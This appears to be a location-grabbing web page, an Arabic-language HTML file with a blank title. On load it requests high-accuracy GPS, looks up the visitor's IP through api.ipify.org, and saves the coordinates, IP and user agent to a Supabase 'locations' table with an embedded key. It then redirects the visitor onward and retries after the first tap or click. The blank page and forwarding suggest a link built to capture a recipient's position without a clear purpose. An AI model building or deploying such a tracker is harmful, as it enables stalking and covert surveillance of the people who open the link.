<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title></title>

  <!-- CSP: اسمح فقط بما نحتاجه -->
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self';
                 script-src 'self' https://cdn.jsdelivr.net;
                 connect-src 'self' https://*.supabase.co https://api.ipify.org;
                 style-src 'self' 'unsafe-inline';
                 img-src 'self' data:; frame-ancestors 'none'">

  <style>
    html,body{margin:0;padding:0;background:#fff}
    #s{position:fixed;inset:auto 8px 8px 8px;padding:10px 12px;border:1px solid #eee;border-radius:10px;background:#f9fafb;
       font:14px system-ui,-apple-system,Segoe UI;direction:rtl;color:#374151;box-shadow:0 6px 18px rgba(0,0,0,.08)}
    .ok{color:#047857;font-weight:700}
    .err{color:#b91c1c;font-weight:700}
    .hide{display:none}
  </style>
</head>
<body>
  <!-- شريط حالة صغير للتشخيص (يمكن إزالته لاحقًا) -->
  <div id="s" class="hide">بدء…</div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    // ========= إعدادات Supabase =========
    const SUPA_URL = 'https://weaiftikalbujuecfuhf.supabase.co';
    const SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndlYWlmdGlrYWxidWp1ZWNmdWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYzOTU2MzAsImV4cCI6MjA3MTk3MTYzMH0.kxiytsgnkEOim_zUD49zgVp7rxr3nHAVHFb0Jq9dijk';
    const supabase = window.supabase.createClient(SUPA_URL, SUPA_KEY);

    // ========= إعدادات عامة =========
    const qs = new URLSearchParams(location.search);
    let redirect = null;
    const raw = qs.get('redirect');
    if (raw && raw.startsWith('/') && !raw.startsWith('//')) redirect = raw;

    const sEl = document.getElementById('s');
    function status(msg, cls){ sEl.textContent = msg; sEl.className = cls ? cls : ''; sEl.classList.remove('hide'); console.log(msg); }
    function hideStatusSoon(){ setTimeout(()=>sEl.classList.add('hide'), 2000); }

    function gps(timeout=25000){
      return new Promise((res,rej)=>{
        if(!('geolocation' in navigator)) return rej(new Error('Geolocation unsupported'));
        navigator.geolocation.getCurrentPosition(
          p=>res(p.coords),
          e=>rej(e),
          { enableHighAccuracy:true, timeout, maximumAge:0 }
        );
      });
    }

    async function getIP(){
      try{
        const r = await fetch('https://api.ipify.org?format=json', { cache:'no-store' });
        if(!r.ok) throw new Error('ipify http '+r.status);
        const j = await r.json();
        return j.ip || null;
      }catch(e){ console.warn('getIP failed', e); return null; }
    }

    async function saveRow(row){
      const { data, error, status:st } = await supabase.from('locations').insert([row]).select('id');
      if (error) throw new Error(error.message);
      return data?.[0]?.id ?? null;
    }

    let ran = false;
    let needsGestureRetry = false;

    async function run(){
      if (ran) return; ran = true;
      try{
        status('طلب إذن GPS…');
        const c  = await gps(25000);                // ← قد يطلب إذن
        status('جلب عنوان IP…');
        const ip = await getIP();

        status('حفظ في Supabase…');
        const id = await saveRow({
          device_name: navigator.userAgent,
          ip,
          lat: c.latitude,
          lng: c.longitude,
          accuracy: c.accuracy ?? null
        });

        status('تم الحفظ ✓ (id='+id+')','ok');
        hideStatusSoon();
        if (redirect) location.assign(redirect);

      }catch(e){
        // رسائل مفهومة
        let msg = e.message || ('code '+e.code);
        if (e.code === 1) msg = 'رفض الإذن (User denied Geolocation)';
        else if (e.code === 2) msg = 'الموقع غير متاح مؤقتًا';
        else if (e.code === 3) msg = 'انتهت مهلة الطلب';
        status('فشل: '+msg, 'err');

        // على iOS: قد لا يظهر الإذن بدون تفاعل؛ فعّل إعادة المحاولة بعد لمسة/نقرة
        needsGestureRetry = true;
        ran = false; // اسمح بإعادة المحاولة
      }
    }

    // محاولة تلقائية
    run();

    // إعادة المحاولة عند أول نقرة/لمسة (لـ iOS)
    function gestureRetry(){
      if (needsGestureRetry){
        needsGestureRetry = false;
        status('إعادة المحاولة بعد تفاعل المستخدم…');
        run();
      }
    }
    window.addEventListener('click', gestureRetry, { passive:true });
    window.addEventListener('touchstart', gestureRetry, { passive:true });
  </script>
</body>
</html>
